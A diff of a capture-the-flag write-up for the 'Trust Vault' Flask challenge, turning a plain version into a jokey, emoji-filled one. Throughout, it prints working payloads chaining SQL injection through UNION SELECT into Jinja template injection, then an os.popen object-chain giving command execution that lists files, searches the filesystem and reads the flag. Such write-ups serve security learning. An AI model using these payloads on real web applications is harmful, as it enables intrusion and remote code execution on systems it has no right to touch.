@@ -1,22 +1,32 @@
-Trust Vault – Writeup
-Challenge Name
+🔐 Trust Vault – Writeup
+🏷️ Challenge Name
 
 Trust Vault
 
-Challenge Description
+📝 Challenge Description
 
-Leak the server-side flag stored on disk/environment by chaining the vulnerable SQL query with the legacy Jinja rendering.
+“Leak the server-side flag stored on disk/environment by chaining the vulnerable SQL query with the legacy Jinja rendering.”
 
-1. Overview
+Ah yes, nothing like a good “chain vulnerabilities like Pokémon evolutions” challenge.
 
-Trust Vault is a Flask web application that exposes a search feature vulnerable to SQL Injection, and internally renders query results using legacy Jinja templates.
-This combination allows chaining:
+1️⃣ Overview
 
-SQL Injection → Jinja SSTI → Python RCE → File Read → Flag
+Trust Vault is a Flask web app with two dangerous ingredients mixed together:
 
-2. Initial Recon
+A vulnerable SQL query 🧨
 
-Navigating the interface revealed key routes:
+A legacy Jinja render engine 🔥
+
+When combined, they allow this delightful attack chain:
+
+👉 SQL Injection → Jinja SSTI → Python RCE → File Read → Flag
+
+Basically, the app handed us the skeleton key and asked us nicely not to use it.
+We used it anyway. 😌
+
+2️⃣ Initial Recon
+
+The app exposes several routes:
 
 /login
 
@@ -30,48 +40,56 @@ Navigating the interface revealed key routes:
 
 /reports
 
-The /search page displayed sanitized SQL queries such as:
+The /search endpoint showed queries like:
 
 SELECT content FROM messages WHERE topic = '<input>'
 
 
-This immediately indicated raw string concatenation and therefore potential SQL injection.
+Which basically screams:
 
-3. Verifying SQL Injection
+💀 “Please inject me.”
 
-Testing with a simple quote:
+Raw string concatenation — a classic security sin.
+
+3️⃣ Verifying SQL Injection
+
+Testing with:
 
 ?topic='
 
 
-Produced:
+Result:
 
 Error: unrecognized token: "'''"
 
 
-This confirmed SQL syntax was breaking → SQL injection valid.
+Boom.
+SQL broken → SQL Injection confirmed. ✔️
 
-4. UNION Injection
+4️⃣ UNION Injection
 
-We tested if output could be controlled:
+Next step: test if we can take over the query output.
 
 ?topic=' UNION SELECT 'TEST'-- -
 
 
-The page displayed:
+The result:
 
 TEST
 
 
-So the application accepts UNION SELECT with a string literal.
+Which means:
 
-That means we can inject any Jinja expression through this SQLi.
+✨ We fully control what gets rendered
+💡 And whatever gets rendered is fed into Jinja…
 
-5. Testing for Jinja SSTI
+Time to make it dance.
 
-Injected:
+5️⃣ Testing for Jinja SSTI
 
-?topic=' UNION SELECT '{{7*7}}'-- -
+Payload:
+
+' UNION SELECT '{{7*7}}'-- -
 
 
 Output:
@@ -79,53 +97,71 @@ Output:
 49
 
 
-This confirmed that the result of the SQL query is passed through Jinja rendering, creating a direct server-side template injection (SSTI) primitive.
+Congratulations —
+🎉 We have Server-Side Template Injection (SSTI)
+And the server is evaluating our expressions like an obedient calculator.
 
-6. Achieving Remote Code Execution via SSTI
+6️⃣ Remote Code Execution via SSTI
 
-Jinja SSTI often allows access to Python internals through object chains.
-
-Working payload:
+Using Jinja’s sneaky object chain trick:
 
 {{ request.application.__globals__.__builtins__.__import__("os").popen("ls").read() }}
 
 
-This executed and returned filesystem contents, confirming:
+This executed on the server and returned directory contents.
 
-Python builtins accessible
+Meaning:
 
-OS commands executable through popen()
+Python internals? ✔️
 
-7. Locating the Flag
+OS commands? ✔️
 
-We searched the entire filesystem for files containing “flag”:
+Full RCE? ✔️
+
+The app is basically ours now.
+(They grow up so fast 🥲)
+
+7️⃣ Locating the Flag
+
+To hunt down the flag:
 
 {{ request.application.__globals__.__builtins__.__import__("os").popen("find / -name '*flag*'").read() }}
 
 
-The result revealed:
+Result revealed:
 
 /flag-e8b7e25d1130eccde065de0d53d21fc8.txt
 
-8. Reading the Flag
 
-Final exploit:
+Like finding treasure with a cheat code. 🗺️💎
 
-?topic=' UNION SELECT '{{ request.application.__globals__.__builtins__.__import__("os").popen("cat /flag-e8b7e25d1130eccde065de0d53d21fc8.txt").read() }}'-- -
+8️⃣ Reading the Flag
+
+The final blow:
+
+' UNION SELECT '{{ request.application.__globals__.__builtins__.__import__("os").popen("cat /flag-e8b7e25d1130eccde065de0d53d21fc8.txt").read() }}'-- -
 
 
-This executed the command server-side and returned the flag.
+The server politely returned the goods.
 
-9. Flag
+🏁 9. Flag
 PCTF{SQL1_C4n_b3_U53D_3Ff1C13N7lY}
 
-10. Attack Chain Summary
-Step	Vulnerability	Result
-1	SQL Injection	Inject arbitrary strings into SQL query
-2	UNION SELECT	Force server to render attacker-controlled text
-3	Jinja SSTI	Evaluate injected template expressions
-4	Python Object Chain	Escalate to full Python execution
-5	OS Command Execution	Run popen() commands
-6	Read Flag	Extract file from disk
 
-A perfect example of why mixing templating and SQL concatenation is like mixing gasoline and open flames.
+A beautiful flag for a beautifully broken application.
+
+🔗 10. Attack Chain Summary
+Step	Vulnerability	Result
+1️⃣	SQL Injection	Inject arbitrary strings
+2️⃣	UNION SELECT	Render attacker-controlled output
+3️⃣	Jinja SSTI	Execute template expressions
+4️⃣	Python Object Chain	Access Python internals
+5️⃣	OS Command Execution	Run system commands
+6️⃣	File Read	Steal the flag
+
+🔥 Final Thoughts
+
+Mixing raw SQL + Jinja rendering is like storing fireworks next to a campfire…
+Sure, it might be fine.
+But then someone like you walks in with a spark and—
+💥 Flag acquired.
